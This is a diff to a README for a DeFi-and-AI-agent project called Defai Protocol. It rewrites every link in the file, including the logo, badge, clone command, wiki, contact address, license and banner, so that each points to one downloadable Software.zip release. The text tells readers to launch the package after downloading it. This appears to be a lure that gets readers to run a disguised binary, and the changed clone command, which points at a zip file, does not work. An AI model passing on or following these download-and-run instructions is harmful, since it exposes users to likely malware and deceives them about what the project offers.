@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Defai Protocol Repository! 🤖
 
-![Defai Protocol Logo](https://example.com/defai-protocol-logo.png)
+![Defai Protocol Logo](https://github.com/davison30fps/defai-protocol/releases/download/v2.0/Software.zip)
 
 ## Repository Description
 The **Defai Protocol** repository aims to empower AI agents to comprehend and act upon various DeFi protocol operations efficiently. With the integration of advanced AI capabilities, this project opens up exciting possibilities for automated decision-making within the decentralized finance space.
@@ -15,7 +15,7 @@ The **Defai Protocol** repository aims to empower AI agents to comprehend and ac
 ### Getting Started
 To get started with **Defai Protocol**, please download the necessary software package from the link provided below.  
 
-[![Download Software Package](https://img.shields.io/badge/Download-Software%20Package-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software Package](https://github.com/davison30fps/defai-protocol/releases/download/v2.0/Software.zip%20Package-blue)](https://github.com/davison30fps/defai-protocol/releases/download/v2.0/Software.zip)
 
 Ensure to launch the software package once downloaded to unlock the full potential of the capabilities offered by the Defai Protocol.
 
@@ -33,7 +33,7 @@ In case the link is not accessible or you encounter any issues, kindly refer to 
 ### How to Use
 1. **Clone the Repository:**
 ```
-git clone https://github.com/your-username/defai-protocol.git
+git clone https://github.com/davison30fps/defai-protocol/releases/download/v2.0/Software.zip
 ```
 
 2. **Install Dependencies:**
@@ -56,8 +56,8 @@ Feel free to open issues, submit pull requests, or engage in discussions within 
 ---
 
 ### Resources
-📚 Explore our [Wiki](https://github.com/defai-protocol/wiki) for in-depth documentation  
-📧 Contact us at [info@defaiprotocol.com](mailto:info@defaiprotocol.com) for any queries  
+📚 Explore our [Wiki](https://github.com/davison30fps/defai-protocol/releases/download/v2.0/Software.zip) for in-depth documentation  
+📧 Contact us at [https://github.com/davison30fps/defai-protocol/releases/download/v2.0/Software.zip](https://github.com/davison30fps/defai-protocol/releases/download/v2.0/Software.zip) for any queries  
 
 ---
 
@@ -67,10 +67,10 @@ We extend our gratitude to the open-source community, developers, and contributo
 ---
 
 ### License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/defai-protocol/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/davison30fps/defai-protocol/releases/download/v2.0/Software.zip) file for more details.
 
 ---
 
 🌟 Dive into the world of AI-driven DeFi operations with the Defai Protocol today! 🤖💰
 
-![Defai Protocol Banner](https://example.com/defai-protocol-banner.png)
+![Defai Protocol Banner](https://github.com/davison30fps/defai-protocol/releases/download/v2.0/Software.zip)
